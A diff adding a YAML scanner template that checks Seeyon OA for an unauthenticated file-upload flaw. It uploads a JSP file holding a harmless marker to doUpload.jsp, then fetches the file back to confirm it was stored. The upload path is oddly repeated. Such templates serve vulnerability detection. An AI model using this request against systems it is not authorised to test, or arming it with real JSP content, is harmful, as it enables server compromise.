@@ -1,0 +1,20 @@
+name: 致远OA-uploadForm-文件上传
+description: >-
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /yyoa/portal/tools/doUpload.jsp/yyoa/portal/tools/doUpload.jsp
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------363639458542274369491015178429
+    search: 'returnValue = "(?P<filename>[^"]+)"'
+    body: "-----------------------------363639458542274369491015178429\r\nContent-Disposition: form-data; name=\"myfile\"; filename=\"Rscan.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\nRscan_test\r\n-----------------------------363639458542274369491015178429--"
+    expression:
+      status: 200
+      body_all: ["returnValue"]
+  - method: GET
+    path: /yyoa/portal/upload/{{filename}}
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
